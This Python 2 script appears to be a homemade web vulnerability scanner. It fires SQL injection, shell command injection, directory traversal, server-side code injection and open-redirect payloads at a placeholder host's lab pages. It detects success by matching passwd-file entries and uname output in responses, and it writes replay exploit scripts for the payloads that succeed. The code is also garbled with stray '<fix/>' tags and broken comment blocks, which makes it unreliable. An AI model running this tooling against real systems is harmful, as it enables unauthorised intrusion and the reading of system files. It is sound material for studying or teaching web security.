import requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = "http://target.com"
sql_injection = "SQL Injection"
server_injection = "Server Side Code Injection"
directory_traversal = "Directory Traversal"
open_redirect = "Open Redirect"
cross_site_request_forgery = "Cross Site Request Forgery"
shell_command = "Shell Command Injection"

def injectPayload(url, method, paramname, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = ""

	#if get
	if method == "GET":
		getURL = parsedURL + "?" + paramname+"="+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == "POST":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text


	result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
	
	#if function returns:
	if result is not None:
		print(url, payload)
		#generateExploit(parsedURL, method, paramname, payload)
		return True
	return None

def timeid(full=False):
	if full==False:
		return datetime.now().strftime("%S-%f")
	else:
		return datetime.now().strftime("%H-%M-%S-%f") 

def generateExploit(url, method, paramname, payload):
#payload is a "payload, type_of_payload" list

	dirname = "exploits/"
	if not os.path.exists(dirname):
		os.makedirs(dirname)

	copy("exploit.py", dirname)

	f = open(dirname + payload[1] + "_" + timeid() + ".sh","w+")
	f.write("python exploit.py " + '"' + url +'" ' + method + " "+ paramname + ' "' +payload[0]+'"')
	


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
	if v == True:
		print html

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None
		return match

	#======= check for shell command injection ======
	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None
		return match

	#===== check for sql_injection ======
	<fix/>"""
	# if attackType == sql_injection:</fix>
		
	<fix/># 	falsePayload = sqli.get_false()[0]
	# 	badhtml = ""
	# 	#if get
	# 	if method == "GET":
	# 		getURL = url + "?" + paramname+"="+falsePayload
	# 		content = requests.get(getURL)
	# 		badhtml =  content.text
	# 	#if post
	# 	elif method == "POST":
	# 		content = requests.post(url, data={paramname:falsePayload})
	# 		badhtml = content.text

	# 	compare_res = sqli.compare_html(badhtml, html)		
	# 	match = re.findall(r'<ins>.+', compare_res)
	# 	if len(match) ==0 :
	# 		return None
	# 	return None
	"""
	# Add another true page to remove false positive
	# Commented for now
	if attackType == sql_injection:
		## for real sql injection, the payloads should return the same result
		## then compare the fake page with the true page to see the difference
		falsePayloads = sqli.get_false()
		badhtml = []
		for falsePayload in falsePayloads:
			#if get
			if method == "GET":
				getURL = url + "?" + paramname+"="+falsePayload
				false_page = requests.get(getURL)
				if(false_page.status_code==200):
					badhtml.append(false_page.text)
				else:
					badhtml.append(requests.get(url).text)
			#if post
			elif method == "POST":
				false_page = requests.post(url, data={paramname:falsePayload})
				if(false_page.status_code==200):
					badhtml.append(false_page.text)
					# print(html)
				else:
					badhtml.append(requests.get(url).text)

		if(content.status_code==200) and badhtml[1]==html:
			compare_res = sqli.compare_html(badhtml[0], html)  
			match = re.findall(r'<ins>.+', compare_res)

		else:
			match = ""</fix>
		if len(match) ==0 :
			return None

		return match


	#====== check for open_redirect=======
	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == "https://status.github.com/messages":
			return True

	
	#=======check for server_injection ====
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + "/index.php")

		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if "GNU/Linux" in html:
			return attackType

	return None;
	
def get_payloads(v=False):
	payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

	if v == True:
		for p in payloads:
			print p[0]

	return payloads


if __name__ == "__main__":
	<fix/># get_payloads(v=True)

	
	## check all pages
	payloads = get_payloads()
	url_list = ['/directorytraversal/directorytraversal.php',
				"/commandinjection/commandinjection.php",
				"/sqli/sqli.php",
				"/serverside/eval2.php",
				"/openredirect/openredirect.php"]
	for payload in payloads:
		injectPayload(url_list[0],  'GET','ascii', payload)
		injectPayload(url_list[1], 'POST', "host", payload)
		injectPayload(url_list[2],  "POST", "username", payload)
		injectPayload(url_list[3],  "POST", "page", payload)
		injectPayload(url_list[4],  "GET", "redirect", payload)

</fix>	

	## test directory shell
	<fix/># url = '/directorytraversal/directorytraversal.php'
	# payloads = dirtraversal.get_all()</fix>

	<fix/># for payload in payloads:
	#     ## need param after endpoint ?param=
		
	#     injectPayload(url, 'ascii', 'GET', payload)</fix>


	# ## test shell command
	# ## post in the form
	# url = "/commandinjection/commandinjection.php"
	# payloads = cmd.get_all()
	# for payload in payloads:
	# 	injectPayload(url, "host", 'POST', payload)

	#sqli
	# post in the form
	#url = "/sqli/sqli.php"
	#payloads = sqli.get_all()
	#for payload in payloads:
	#	injectPayload(url, "username", "POST", payload)

	#Test for server side code injection
	# url = "/serverside/eval2.php"
	# payloads = ssci.get_all(url)
	# for payload in payloads:
	# 	injectPayload(url, "page", "POST", payload)
	'''
	#test for open redirect
	url = "/openredirect/openredirect.php"
	orPayload = oRedirect.get_all()
	for payload in orPayload:
		<fix/>injectPayload(url, "redirect", "GET", payload)</fix>
	'''
